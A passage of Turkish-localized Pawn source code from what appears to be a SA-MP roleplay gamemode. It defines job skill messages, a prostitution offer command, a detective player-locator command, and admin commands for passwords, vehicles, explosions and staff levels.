			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Balýkçýlýk levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için  %d balýk yakalamalýsýnýz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Balýkçýlýk levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için  %d balýk yakalamalýsýnýz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Balýkçýlýk levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için  %d balýk yakalamalýsýnýz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Balýkçýlýk levelin artýk = 5"); }
		}
		case 10://Trucker
		{
			new level = PlayerInfo[playerid][pTruckSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Kamyonculuk levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d yük daha teslim etmelisiniz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Kamyonculuk levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d yük daha teslim etmelisiniz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Kamyonculuk levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d yük daha teslim etmelisiniz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Kamyonculuk levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d yük daha teslim etmelisiniz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Kamyonculuk levelin artýk = 5"); }
		}
		case 11://arac Jacker
		{
			new level = PlayerInfo[playerid][pCarSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Araç hýrsýzlýðý levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d aracý daha çalýp satmalýsýnýz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Araç hýrsýzlýðý levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d aracý daha çalýp satmalýsýnýz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Araç hýrsýzlýðý levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d aracý daha çalýp satmalýsýnýz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Araç hýrsýzlýðý levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d aracý daha çalýp satmalýsýnýz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Araç hýrsýzlýðý levelin artýk = 5"); }
		}
		/*case 12:// Craftsman
		{
			new level = PlayerInfo[playerid][pCraftSkill], string[128];
			if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 1."); format(string, sizeof(string), "You need to craft %d more items to level up.", 51 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 2."); format(string, sizeof(string), "You need to craft %d more items to level up.", 101 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 3."); format(string, sizeof(string), "You need to craft %d more items to level up.", 201 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 4."); format(string, sizeof(string), "You need to craft %d more items to level up.", 401 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 5."); }
		}*/
		default:
		{
			SendClientMessage(playerid, COLOR_GREY, "Bilinmeyen yetenek numarasý girildi.");
		}
	}
	return 1;
}

CMD:sex(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 3 || PlayerInfo[playerid][pJob2] == 3)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Sadece aracýn içindeyken seks yapabilirsin.");
			return 1;
		}
		new Car = GetPlayerVehicleID(playerid);

		new string[128], giveplayerid, money;
		if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /sex [Oyuncu ID/Ýsim] [fiyat]");

		if(money < 1 || money > 10000) { SendClientMessage(playerid, COLOR_GREY, "   Ücret $1'dan az yada $10.000'dan fazla olamaz."); return 1; }
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendinle seks yapamazsýn."); return 1; }
					if(IsPlayerInAnyVehicle(playerid) && IsPlayerInVehicle(giveplayerid, Car))
					{
						if(PlayerInfo[playerid][pSexTime] < 1)
						{
							format(string, sizeof(string), "* %s adlý kiþiye $%d'a seks teklifi yaptýn.", GetPlayerNameEx(giveplayerid), money);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Hayat kadýný %s, sana $%d karþýlýðýnda seks teklifi yaptý. Kabul etmek için (/kabulet sex)", GetPlayerNameEx(playerid), money);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							SexOffer[giveplayerid] = playerid;
							SexPrice[giveplayerid] = money;
							PlayerInfo[playerid][pSexTime] = 60;
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD2, "Zaten seks yaptýn, komut kullanma süresini bekle.");
							return 1;
						}
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   Ýkinizde araçta olmalýsýnýz.");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Hayat kadýný deðilsin.");
	}
	return 1;
}

CMD:takipet(playerid, params[]) {
	if(PlayerInfo[playerid][pJob] != 1 && PlayerInfo[playerid][pJob2] != 1) {
		SendClientMessage(playerid, COLOR_GREY, "Dedektif deðilsin.");
	}
	else if(UsedFind[playerid]) {
		SendClientMessage(playerid, COLOR_GREY, "Zaten birinin yerini buldun - biraz bekle.");
	}
	else {

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /takipet [Oyuncu ID/Ýsim]");
		}
		else if(iTargetID == playerid) {
			SendClientMessage(playerid, COLOR_GREY, "Kendi kendine bu komutu kullanamazsýn");
		}
		else if(!IsPlayerConnected(iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		}
		else if(GetPlayerInterior(iTargetID) != 0) {
			SendClientMessage(playerid, COLOR_GREY, "Aradýðýn kiþi bir binanýn içerisinde.");
		}
		else if(PlayerInfo[iTargetID][pAdmin] >= 1 && AdminDuty[iTargetID] == 1) {
			SendClientMessage(playerid, COLOR_GREY, "Bu kiþiyi bulamýyorsun.");
		}
		else {

			switch(PlayerInfo[playerid][pDetSkill]) {
				case 0 .. 49: {
					FindTimePoints[playerid] = 4;
					UsedFind[playerid] = 120;
				}
				case 50 .. 99: {
					FindTimePoints[playerid] = 6;
					UsedFind[playerid] = 90;
				}
				case 100 .. 199: {
					FindTimePoints[playerid] = 8;
					UsedFind[playerid] = 60;
				}
				case 200 .. 399: {
					FindTimePoints[playerid] = 10;
					UsedFind[playerid] = 30;
				}
				default: {
					FindTimePoints[playerid] = 12;
					UsedFind[playerid] = 15;
				}
			}

			new
				szZone[MAX_ZONE_NAME],
				szMessage[108];

			SetPlayerMarkerForPlayer(playerid, iTargetID, FIND_COLOR);
			GetPlayer3DZone(iTargetID, szZone, sizeof(szZone));
			format(szMessage, sizeof(szMessage), "%s adlý kiþinin son görüldüðü yer %s.", GetPlayerNameEx(iTargetID), szZone);
			SendClientMessage(playerid, COLOR_GRAD2, szMessage);
			FindingPlayer[playerid]=iTargetID;
			FindTime[playerid] = 1;

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pDetSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pDetSkill]++;
				}
			#else
				PlayerInfo[playerid][pDetSkill]++;
			#endif

			switch(PlayerInfo[playerid][pDetSkill]) {
				case 50: SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiflik yeteneðin artýk 2 level, biraz daha hýzlý yer bulabilirsin.");
				case 100: SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiflik yeteneðin artýk 3 level, biraz daha hýzlý yer bulabilirsin.");
				case 200: SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiflik yeteneðin artýk 4 level, biraz daha hýzlý yer bulabilirsin.");
				case 400: SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiflik yeteneðin artýk 5 level, biraz daha hýzlý yer bulabilirsin.");
			}
		}
	}
	return 1;
}

CMD:changeuserpassword(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] < 5)
        return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

   	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

    new
		string[128],
		accountName[24],
		szPassword[64],
		password[64];

    if(sscanf(params, "s[MAX_PLAYER_NAME]s[64]", accountName, password))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /changeuserpassword [oyuncuadý] [new password]");

	mysql_real_escape_string(accountName, accountName, g_MySQLConnections[0]);
	mysql_real_escape_string(password, szPassword, g_MySQLConnections[0]);

	SetPVarString(playerid, "opasschange", szPassword);
	SetPVarString(playerid, "opasschangetarget", accountName);

	format(string, sizeof(string), "SELECT Username FROM players WHERE Username = '%s' AND AdminLevel = 0", accountName);
	mysql_query(string, THREAD_CHECK_NAME_PASSWORD, playerid, g_MySQLConnections[0]);
    return 1;
}


CMD:sifredegistir(playerid, params[]) {
	if(gPlayerLogged[playerid])
		ShowPlayerDialogEx(playerid, 2398, DIALOG_STYLE_INPUT, "Þifre Deðiþtirme", "Lütfen yeni þifrenizi girin.", "Deðiþtir", "Iptal");

	return 1;
}

CMD:givenos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /givenos [Oyuncu ID/Ýsim]");

		if(!IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
			return 1;
		}
		if(IsPlayerInAnyVehicle(giveplayerid))
		{
			new VehicleID = GetPlayerVehicleID(giveplayerid), Model = GetVehicleModel(VehicleID);
			switch(Model)
			{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586,449: return
				SendClientMessage(playerid,COLOR_GRAD1,"Bu aracý modifiye edemezsin.");
			}
			AddVehicleComponent(VehicleID, 1010); PlayerPlaySound(giveplayerid,1133,0.0,0.0,0.0); //NOS
			format(string, sizeof(string), "%s adlý kiþinin aracýna baþarýlý bir þekilde NOS ekledin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid,COLOR_GRAD1,string);
		}
		else
		{
			SendClientMessage(playerid,COLOR_GRAD1,"Oyuncu araçta olmak zorunda.");
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_GRAD1,"Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:blowup(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /blowup [Oyuncu ID/Ýsim]");

	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(IsPlayerConnected(giveplayerid))
		{
				format(string, sizeof(string), "%s (ID: %d) adlý kiþiyi baþarýlý bir þekilde patlattýn.",GetPlayerNameEx(giveplayerid),giveplayerid);
				SendClientMessage(playerid,COLOR_GRAD2,string);
				new Float:boomx, Float:boomy, Float:boomz;
				GetPlayerPos(giveplayerid,boomx, boomy, boomz);
				CreateExplosion(boomx, boomy , boomz, 7, 1);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:oldcar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128];
		format(string, sizeof(string), "Son sürdüðün aracýn ID'si %d.",gLastCar[playerid]);
		SendClientMessage(playerid, COLOR_GREY, string);
	}
	return 1;
}

CMD:gotocar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new carid;
		if(sscanf(params, "d", carid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotocar [carid]");

		new Float:cwx2,Float:cwy2,Float:cwz2;
		GetVehiclePos(carid, cwx2, cwy2, cwz2);
		if(GetPlayerState(playerid) == 2)
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, cwx2, cwy2, cwz2);
			TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			fVehSpeed[playerid] = 0.0;
		}
		else
		{
			SetPlayerPos(playerid, cwx2, cwy2, cwz2);
		}
		new string[128];
		format(string, sizeof(string), "%d ID'li aracýn yanýna teleport oldun.", carid);
		SendClientMessage(playerid, COLOR_GRAD1, string);
		SetPlayerInterior(playerid,0);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:getcar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new carid;
		if(sscanf(params, "d", carid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /getcar [carid]");
		new Float:plocx,Float:plocy,Float:plocz;

		GetPlayerPos(playerid, plocx, plocy, plocz);
		SetVehiclePos(carid,plocx,plocy+4, plocz);
		SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
		LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		new string[128];
		format(string, sizeof(string), "%d ID'li aracý kendine çektin.", carid);
		SendClientMessage(playerid, COLOR_GRAD1, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:sethelper(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 7 || PlayerInfo[playerid][pHelper] >= 6) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new
			iLevel,
			iTarget;

		if(sscanf(params, "ud", iTarget, iLevel))
			return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /sethelper [Oyuncu ID/Ýsim] [level]");

		if(iLevel <= -1 || iLevel >= 7)
		    return SendClientMessage(playerid, COLOR_GREY, "Helper levelleri 1'den baþlar 6'da biter.");

		if(iTarget != INVALID_PLAYER_ID) {
		    if(PlayerInfo[iTarget][pAdmin] > 0)
		        return SendClientMessage(playerid, COLOR_GREY, "Bir admini helper yapamazsýn.");

			if(iLevel >= 6 && PlayerInfo[playerid][pAdmin] < 6)
			    return SendClientMessage(playerid, COLOR_GREY, "Birine 6 Level helperlik verebilmek için en az Level 6 admin olman gerek.");

			PlayerInfo[iTarget][pHelper] = iLevel;

			new
			    szMessage[64];


			if(PlayerInfo[iTarget][pAcceptReport] > 0)
			    PlayerInfo[iTarget][pAcceptReport] = 0;

			format(szMessage, sizeof(szMessage), "%s adlý oyuncuyu %d level helper yaptýn.", GetPlayerNameEx(iTarget), iLevel);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			format(szMessage, sizeof(szMessage), "%s seni %d level helper yaptý.", GetPlayerNameEx(playerid), iLevel);
			SendClientMessage(iTarget, COLOR_WHITE, szMessage);
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:setemlak(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 7) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new
			iLevelE,
			iTargetE;

		if(sscanf(params, "ud", iTargetE, iLevelE))
			return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /setemlak [Oyuncu ID/Ýsim] 1");

		if(iLevelE <= -1 || iLevelE >= 2)
		    return SendClientMessage(playerid, COLOR_GREY, "Emlak Zaten 1 SEVÝYE BOÞUNA UÐRAÞMA KNK");

		if(iTargetE != INVALID_PLAYER_ID) {
			if(iLevelE >= 6 && PlayerInfo[playerid][pAdmin] < 6)
			    return SendClientMessage(playerid, COLOR_GREY, "Birine 6 Level emlakçý verebilmek için en az Level 6 admin olman gerek.");

			PlayerInfo[iTargetE][pEmlak] = iLevelE;

			new
			    szMessage[64];


			if(PlayerInfo[iTargetE][pAcceptReport] > 0)
			    PlayerInfo[iTargetE][pAcceptReport] = 0;

			format(szMessage, sizeof(szMessage), "%s adlý oyuncuyu %d level emlakçý yaptýn.", GetPlayerNameEx(iTargetE), iLevelE);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			format(szMessage, sizeof(szMessage), "%s seni %d level emlakçý yaptý.", GetPlayerNameEx(playerid), iLevelE);
			SendClientMessage(iTargetE, COLOR_WHITE, szMessage);
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:helpertest(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] == 7 || PlayerInfo[playerid][pHelper] == 0) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new
			iLevel,
			iTarget;

		if(sscanf(params, "ud", iTarget, iLevel))
			return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /sethelper [Oyuncu ID/Ýsim] [level]");

		if(iLevel <= -1 || iLevel >= 7)
		    return SendClientMessage(playerid, COLOR_GREY, "Helper levelleri 1'den baþlar 5'de biter.");

		if(iTarget != INVALID_PLAYER_ID) {
		    if(PlayerInfo[iTarget][pAdmin] > 0)
		        return SendClientMessage(playerid, COLOR_GREY, "Bir admini helper yapamazsýn.");

			if(iLevel >= 5 && PlayerInfo[playerid][pAdmin] < 5)
			    return SendClientMessage(playerid, COLOR_GREY, "Birine 5 Level helperlik verebilmek için en az Level 5 admin olman gerek.");

			PlayerInfo[iTarget][pHelper] = iLevel;

			new
			    szMessage[64];


			if(PlayerInfo[iTarget][pAcceptReport] > 0)
			    PlayerInfo[iTarget][pAcceptReport] = 0;

			format(szMessage, sizeof(szMessage), "%s adlý oyuncuyu %d level helper yaptýn.", GetPlayerNameEx(iTarget), iLevel);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			format(szMessage, sizeof(szMessage), "%s seni %d level helper yaptý.", GetPlayerNameEx(playerid), iLevel);
			SendClientMessage(iTarget, COLOR_WHITE, szMessage);
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:setadmin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 8)
	{
		new
			iAdminValue,
			iTargetID;

		if(sscanf(params, "ui", iTargetID, iAdminValue))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setadmin [Oyuncu ID/Ýsim] [level]");
		}
		if(iAdminValue <= -1 || iAdminValue >= 9)
		{
		SendClientMessage(playerid, COLOR_GREY, "En fazla Level 8 Adminlik verebilirsin.");
		}
		else if(IsPlayerConnected(iTargetID))
		{
			if(AdminDuty[iTargetID] != 0)
			{
		    	SendClientMessage(playerid, COLOR_WHITE, "Bu admin þuanda iþbaþýnda, Levelini deðiþtirebilmen için iþbaþýndan çýkmasý gerek.");
		    	return 1;
			}
			new szMessage[47 + (MAX_PLAYER_NAME * 2)];

			format(szMessage, sizeof(szMessage), "AdminKomutu: %s, %s adlý adminin Levelini %d olarak deðiþtirdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID), iAdminValue);
			ABroadCast(COLOR_LIGHTRED,szMessage, 1);
			PlayerInfo[iTargetID][pAdmin] = iAdminValue;
   			format(szMessage, sizeof(szMessage), "Admin Level'in %d olarak deðiþtirildi, deðiþtiren: %s.", iAdminValue, GetPlayerNameEx(playerid));
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			if(PlayerInfo[iTargetID][pHelper] >= 1) {
			    PlayerInfo[iTargetID][pHelper] = 0;
			    PlayerInfo[iTargetID][pAcceptReport] = 0;
			}

			if(iAdminValue == 0)
			{
                format(PlayerInfo[iTargetID][pAdminName], MAX_PLAYER_NAME, "0");
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:setadminname(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		new giveplayerid, name[32];
		if(sscanf(params, "us[32]", giveplayerid, name))
		{
            SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setadminname [Oyuncu ID/Ýsim] [name]");
            return 1;
		}

		if(PlayerInfo[giveplayerid][pAdmin] < 1)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "Bu oyuncu admin deðil.");
		    return 1;
		}

		if(AdminDuty[giveplayerid] != 0)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "Bu admin þuanda iþbaþýnda, ismini deðiþtirebilmek için iþbaþýndan çýkmasý gerek.");
		    return 1;
		}

		new length = strlen(name);
		if(length < 3 || length > 20)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "Ýsim 3 karakterden az, 20 karakterden fazla olamaz.");
		    return 1;
		}

		if(strfind(name, "_", true) != -1)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "Admin ismi tek isim olmalýdýr, alt çizgi kullanýlmaz.");
		    return 1;
		}

		if(strcmp(name, "Zhao", true) == 0 && PlayerInfo[playerid][pAdmin] < 6) {
		    SendClientMessage(playerid, COLOR_WHITE, "stop ! im zao ! you're not zao !");
			return 1;
		}

		new string[128];
		format(string, sizeof(string), "AdminKomutu: %s, %s adlý adminin admin ismini '%s' olarak ayarladý.", GetPlayerNameEx(playerid),  GetPlayerNameEx(giveplayerid), name);
		ABroadCast(COLOR_LIGHTRED, string, 1);

        format(PlayerInfo[giveplayerid][pAdminName], 32, name);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:adminduty(playerid, params[]) {
	return cmd_aduty(playerid, params);
}

CMD:reportsold(playerid, params[]) {
	return cmd_reports(playerid, params);
}

CMD:aduty(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(strlen(PlayerInfo[playerid][pAdminName]) > 2 && strlen(PlayerInfo[playerid][pAdminName]) < 20) {
		    new
				string[128];

 			if(AdminDuty[playerid] != 0) {
				if(GetPlayerState(playerid) == PLAYER_STATE_WASTED)
				    return SendClientMessage(playerid, COLOR_GRAD2, "Yakalanmýþken bunu yapamazsýn.");

				ResetPlayerWeapons(playerid);
				SetPlayerArmedWeapon(playerid, 0);

				if(Spectating[playerid] > 0 && PlayerInfo[playerid][pAdmin] >= 2) {
					GettingSpectated[Spectate[playerid]] = 999;
					Spectating[playerid] = 0;
					Spectate[playerid] = 999;
					SetPVarInt(playerid, "SpecOff", 1);
					TogglePlayerSpectating(playerid, false);
					SetCameraBehindPlayer(playerid);
				}

				if(MP3Station[playerid] != 0) {
					MP3Station[playerid] = 0;
					StopAudioStreamForPlayer(playerid);
				}

				SetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
				SetPlayerArmourEx(playerid, PlayerInfo[playerid][pArmor]);

 				format(string, sizeof(string), "%s (ID %d - %s) %d Level admin olarak iþbaþýndan çýktý.", PlayerInfo[playerid][pAdminName], playerid, GetPlayerNameEx(playerid), PlayerInfo[playerid][pAdmin]);
				PlayerInfo[playerid][pmka] = 0;
 				ABroadCast(COLOR_WHITE, string, 1);

   				if(PlayerInfo[playerid][pAdmin] == 1) {
					SendClientMessage(playerid, COLOR_YELLOW, "You're now off-duty as admin, but still have access to your Level 1 Admin commands.");
				} else if(PlayerInfo[playerid][pAdmin] > 1 && PlayerInfo[playerid][pAdmin] < 6) {
					SendClientMessage(playerid, COLOR_YELLOW, "You're now off-duty as admin, and only have access to /admins /check /jail /ban /sban /kick /skick /showflags /reports /nrn");
				} else if(PlayerInfo[playerid][pAdmin] == 6) {
					SendClientMessage(playerid, COLOR_YELLOW, "Ýþbaþýndan çýktýn ancak A6 olduðundan dolayý tüm komutlarý hala kullanabiliyorsun.");
				} else { }

				SendClientMessage(playerid, COLOR_REALRED, "Adminlikte kullanýyor olduðun tüm hileleri kapatmayý unutma.");

				ResetPlayerVariables(playerid);
				AttemptPlayerLogin(playerid, AdminRelogPassword[playerid]);
 			}
 			else
 			{
 				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				GetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
				GetPlayerArmour(playerid, PlayerInfo[playerid][pArmor]);
				SaveAccount(playerid);

				if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]))
				{
					DestroyDynamicObject(PlayerInfo[playerid][pWeedObject]);
				}

 			    PhoneOnline[playerid] = 1;

				for(new i = 0; i < MAX_REPORTS; i++)
				{
	    			if(Reports[i][ReportFrom] == playerid)
	    			{
	        			Reports[i][ReportFrom] = 999;
						Reports[i][BeingUsed] = 0;
						Reports[i][TimeToExpire] = 0;
					}
				}

				if(GotHit[playerid] > 0)
				{
					if(GetChased[playerid] < 999)
					{
						if(IsPlayerConnected(GetChased[playerid]))
						{
							SendClientMessage(GetChased[playerid], COLOR_YELLOW, "Eylem yapacaðýn kiþi oyundan çýktý.");
							GoChase[GetChased[playerid]] = 999;
						}
					}
				}
 				if(GoChase[playerid] < 999)
 				{
      				GetChased[GoChase[playerid]] = 999;
      				GotHit[GoChase[playerid]] = 999;
 				}

				SetPVarInt(playerid, "TempName", 1);
				new username[MAX_PLAYER_NAME];
				GetPlayerName(playerid, username, sizeof(username));
